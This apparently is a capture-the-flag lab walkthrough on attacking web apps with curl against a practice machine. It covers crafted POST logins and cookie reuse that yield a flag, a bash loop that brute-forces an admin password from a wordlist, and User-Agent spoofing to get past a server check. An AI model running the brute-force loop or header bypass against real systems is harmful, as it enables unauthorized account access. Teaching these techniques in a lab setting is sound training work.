
--- Exploitation with cURL ---

Applications, like our browsers, communicate with servers using HTTP (Hypertext Transfer Protocol). Think of HTTP as the language for asking a server for resources (pages, images, JSON data) and getting answers back.
In the absence of a browser, you can still speak HTTP directly from the command line. The simplest way is with cURL.
curl is a command-line tool for crafting HTTP requests and viewing raw responses. It's ideal when you need precision or when GUI tools aren't available.

• Trying out cURL
• Sending POST Requests
• Using Cookies and Sessions
• Automating Login and Performing Brute Force Using cURL
• Bypassing User-Agent Checks


➜ Trying out cURL

What happens after running the command is that curl sends an HTTP GET request for the site's home page. An HTTP response is received containing the body, which is then printed in the terminal.

root@attackbox:~# curl http://10.81.190.145/

➜ Sending POST Requests

Suppose you've found a login form whose POST target is /post.php. When you log in through a browser, it sends a POST request to the server containing the credentials you entered. 

root@attackbox:~# curl -X POST -d "username=user&password=user" http://10.81.190.145/post.php      
root@attackbox:~# curl -X POST -d "username=user&password=user&submit=Login" http://10.81.190.145/post.php      
root@attackbox:~# curl -i -X POST -d "username=user&password=user" http://10.81.190.145/post.php

root@ip-10-81-103-180:~# curl -i -X POST -d "username=user&password=user&submit=Login" http://10.81.190.145/post.php
HTTP/1.1 200 OK
Date: Fri, 02 Jan 2026 18:04:18 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Length: 21
Content-Type: text/html; charset=UTF-8

Invalid credentials.
root@ip-10-81-103-180:~#

➜ Using Cookies and Sessions

Once you log in, web applications use cookies to keep your session active. When you make another request with your browser, the cookie gets sent automatically, but with cURL, you need to handle it yourself.

Step 1: Save the cookies
      
root@attackbox:~# curl -c cookies.txt -d "username=admin&password=admin" http://10.81.190.145/session.php

Step 2: Reuse the saved cookies
      
root@attackbox:~# curl -b cookies.txt http://10.81.190.145/session.php

root@ip-10-81-83-126:~# curl -X POST -d "username=admin&password=admin&submit=Login" http://10.81.149.70/cookie.php 
Login successful. Cookie set.
root@ip-10-81-83-126:~#  
root@ip-10-81-83-126:~# curl -c cookies.txt -d "username=admin&password=admin" http://10.81.149.70/cookie.php
Login successful. Cookie set.
root@ip-10-81-83-126:~# 
root@ip-10-81-83-126:~# curl -b cookies.txt http://10.81.149.70/cookie.php
Welcome back, admin!
Flag: THM{session_cookie_master}
root@ip-10-81-83-126:~#


➜ Automating Login and Performing Brute Force Using cURL    

for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done

• $(cat passwords.txt) reads each password from the file
• curl -s sends the login request silently (no progress meter)
• The response is stored in a variable
• grep -q checks if the response contains a success string (like “Welcome”)
• When found, it prints the working password and exits the loop.


➜ Bypassing User-Agent Checks

Some applications block cURL by checking the User-Agent header. For example, the server may reject requests with: User-Agent: curl/7.x.x
      
root@attackbox:~# curl -A "internalcomputer" http://10.81.149.70/ua_check.php
      
root@attackbox:~# curl -i http://10.81.149.70/ua_check.php
root@attackbox:~# curl -i -A "internalcomputer" http://10.81.149.70/ua_check.php


*

























*







    
    
    
